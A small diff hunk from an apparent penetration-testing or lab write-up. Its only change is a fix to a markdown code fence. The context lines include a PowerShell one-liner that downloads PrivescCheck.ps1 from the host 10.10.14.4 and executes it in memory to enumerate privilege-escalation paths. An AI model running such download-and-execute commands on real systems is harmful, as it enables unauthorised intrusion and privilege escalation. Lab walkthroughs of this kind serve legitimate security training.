@@ -335,4 +335,4 @@ domain_computers.grep        domain_computers.json  domain_groups.html  domain_p
 # Upload and run privcheck.ps1:
 ```bash
 PS C:\users\alcibiades\desktop> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.4/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended
-```bash
+```
